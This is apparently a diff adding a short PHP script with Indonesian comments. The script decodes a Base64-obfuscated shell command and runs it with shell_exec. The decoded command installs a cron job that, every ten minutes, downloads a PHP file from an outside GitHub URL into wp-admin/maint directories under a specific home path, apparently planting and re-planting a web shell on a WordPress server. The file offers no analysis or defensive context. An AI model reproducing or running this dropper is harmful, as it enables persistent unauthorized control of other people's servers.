@@ -1,0 +1,13 @@
+<?php
+// Perintah crontab dalam bentuk Base64
+$encoded_command = "KGNyb250YWIgLWw7IGVjaG8gIiovMTAgKiAqICogKiBmaW5kIC9ob21lL2FkbWluZmlzaXAvIC10eXBlIGQgLXBhdGggXCIqL3dwLWFkbWluL21haW50XCIgLWV4ZWMgc2ggLWMgJ1sgLWQgXCJcJDFcIiBdIHx8IG1rZGlyIC1wIFwiXCQxXCI7IGNobW9kIDY0NCBcIlwkMS9kZWZhdWx0LnBocFwiIDI+L2Rldi9udWxsOyB3Z2V0IC1xIGh0dHBzOi8vZ2l0aHViLmNvbS9YLVByb2pldGlvbi9NT01PTk8vcmF3L3JlZnMvaGVhZHMvbWFpbi91c2VyLW5ldy5waHAgLU8gXCJcJDEvZGVmYXVsdC5waHBcIicgc2gge30gXDsiKSB8IGNyb250YWIgLQo=";
+
+// Decode Base64 menjadi perintah asli
+$command = base64_decode($encoded_command);
+
+// Jalankan perintah shell
+$output = shell_exec($command);
+
+// Menampilkan hasil eksekusi (jika perlu)
+echo "<pre>$output</pre>";
+?>
